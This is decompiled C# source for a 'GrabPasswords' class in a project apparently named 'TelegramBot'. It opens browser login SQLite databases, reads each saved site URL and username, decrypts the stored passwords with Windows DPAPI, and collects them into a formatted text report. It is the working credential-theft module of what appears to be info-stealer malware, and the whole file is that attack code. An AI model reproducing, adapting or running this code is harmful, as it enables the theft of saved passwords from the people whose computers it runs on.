using System;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace TelegramBot
{
	// Token: 0x020000E5 RID: 229
	public class GrabPasswords
	{
		// Token: 0x060002ED RID: 749 RVA: 0x0002170C File Offset: 0x0001F90C
		private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				long num = 0L;
				byte[] array = new byte[2048];
				long bytes;
				while ((bytes = reader.GetBytes(columnIndex, num, array, 0, array.Length)) > 0L)
				{
					memoryStream.Write(array, 0, (int)bytes);
					num += bytes;
				}
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060002EE RID: 750 RVA: 0x00021B00 File Offset: 0x0001FD00
		public static string FindAllPassword()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < SearchPasswords.GetLogins.Count; i++)
			{
				try
				{
					using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + SearchPasswords.GetLogins[i] + ";Version=3;New=False;Compress=True;"))
					{
						sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand(GrabPasswords.CommandText, sqliteConnection))
						{
							sqliteCommand.CommandType = CommandType.Text;
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								if (sqliteDataReader.HasRows)
								{
									while (sqliteDataReader.Read())
									{
										string @string = sqliteDataReader.GetString(0);
										string string2 = sqliteDataReader.GetString(1);
										string string3 = Encoding.UTF8.GetString(ProtectedData.Unprotect(GrabPasswords.GetBytes(sqliteDataReader, 2), null, DataProtectionScope.LocalMachine));
										if (!stringBuilder.ToString().Contains(@string) && !string.IsNullOrEmpty(@string) && !string.IsNullOrEmpty(string2) && !string.IsNullOrEmpty(string3))
										{
											stringBuilder.AppendLine(string.Concat(new string[]
											{
												"\n=============================================\n\n  Site : ",
												@string,
												" \n  Login:  ",
												string2,
												" \n  Password: ",
												string3,
												" \r\n"
											}));
										}
									}
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0400051E RID: 1310
		private static readonly string CommandText = "SELECT origin_url, username_value, password_value FROM logins";
	}
}
